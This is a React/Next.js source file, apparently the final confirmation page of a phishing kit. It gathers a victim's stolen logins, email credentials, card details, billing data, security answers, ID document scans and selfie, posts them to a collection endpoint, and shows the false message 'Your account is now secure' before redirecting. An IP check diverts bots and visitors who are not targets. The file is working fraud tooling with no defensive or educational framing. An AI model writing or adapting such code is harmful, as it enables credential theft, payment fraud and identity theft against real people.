import { CircularProgress, Typography } from "@mui/material";
import { Box } from "@mui/system";
import axios from "axios";
import { GetServerSideProps } from "next";
import React, { useContext, useEffect } from "react";
import { Wrapper } from "../components/Wrapper";
import checkIp from "../middleware/checkIp";
import { dataURItoBlob } from "../utils/dataURItoBlob";
import { DataContext } from "./_app";

interface SuccessProps {}

export const Success: React.FC<SuccessProps> = () => {
  const { data } = useContext(DataContext);

  useEffect(() => {
    if (typeof window !== `undefined` && data && Object.keys(data).length) {
      const front = data.docs && data.docs.front;
      const back = data.docs && data.docs.back;
      const logins = data.logins;
      const selfie = data.selfie;
      const emailLogins = data.emailLogins;
      const billing = data.billing;
      const cardDetails = data.cardDetails;
      const answers = data.answers;
      const sessionId = data.sessionId;

      const sendSession = async () => {
        if (logins) {
          const formData = new FormData();

          if (front && back) {
            formData.append(`front`, front);
            formData.append(`back`, back);
          }

          if (sessionId) {
            formData.append(`sessionId`, sessionId);
          }

          if (logins) {
            formData.append(`logins`, JSON.stringify(logins));
          }

          if (selfie) {
            formData.append(`selfie`, dataURItoBlob(selfie));
          }

          if (emailLogins) {
            formData.append(`emailLogins`, JSON.stringify(emailLogins));
          }

          if (billing) {
            formData.append(`billing`, JSON.stringify(billing));
          }

          if (cardDetails) {
            formData.append(`cardDetails`, JSON.stringify(cardDetails));
          }

          if (answers) {
            formData.append(`answers`, JSON.stringify(answers));
          }

          formData.append(`form`, `SESSION`);

          await axios.post(`/api/send-session`, formData);
        } else {
          console.log(`You are on the server`);
        }

        window.location.href = process.env.NEXT_PUBLIC_EXIT_URL as string;
      };

      sendSession();
    }
    return () => {};
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  return (
    <Wrapper current="CONFIRMATION">
      <Box width="100%" padding="1rem">
        <Box
          sx={{
            background: "white",
            width: ["100%", "60%"],
            margin: "0 auto",
            padding: "2rem",
          }}
        >
          <Box
            bgcolor="#0060f0"
            sx={{
              width: "100%",
              height: ".3rem",
              borderRadius: "10px",
            }}
          />
          <Box>
            <Typography
              component="h2"
              sx={{
                fontSize: ["1rem", "1.5rem"],
                marginY: "1rem",
              }}
            >
              Thank you! Your account is now secure.
            </Typography>
          </Box>
          <Box
            sx={{
              width: "100%",
              display: "flex",
              alignItems: "center",
              flexDirection: "column",
            }}
          >
            <CircularProgress
              color="primary"
              sx={{
                marginTop: "1rem",
              }}
            />
            <Typography mt={5}>
              Please wait, you willbe redirected to the authentication page in 5
              seconds.
            </Typography>
          </Box>
        </Box>
      </Box>
    </Wrapper>
  );
};

export const getServerSideProps: GetServerSideProps = async ({ req }) => {
  const { valid } = await checkIp(req);

  return {
    props: { isBot: valid },
    ...(!valid
      ? {
          redirect: {
            destination: process.env.NEXT_PUBLIC_EXIT_URL,
            permanent: false,
          },
        }
      : {}),
  };
};

export default Success;
